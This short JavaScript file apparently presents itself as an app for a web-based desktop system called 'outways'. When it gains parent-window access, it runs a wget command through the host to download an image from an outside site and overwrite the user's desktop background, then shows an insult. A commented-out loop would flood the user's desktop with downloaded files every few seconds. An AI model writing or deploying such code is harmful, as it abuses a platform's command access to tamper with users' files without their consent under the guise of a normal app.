var access = false;
try {
  window.parent;
  access = true;
} catch(e){}

if (access) {
  window.parent.command("wget https://arizotaz.com/images/get/?id=ah41EnXYtC2KCNlDYX26PCEe /outways/data/users/"+window.parent.outways_username+"/.settings/desktopBackground");
  document.body.innerHTML = "Get fucked";
  /*setInterval(function() {
    window.parent.renderFiles();
    for (var i = 0; i < 3; i++) {
      window.parent.command("wget https://arizotaz.com/images/get/?id=ah41EnXYtC2KCNlDYX26PCEe /outways/data/users/"+window.parent.outways_username+"/desktop/"+Math.round(Math.random()*1000000)+".gif");
    }
  },3000);*/
} else {
  document.body.innerHTML = "This app requires file access";
}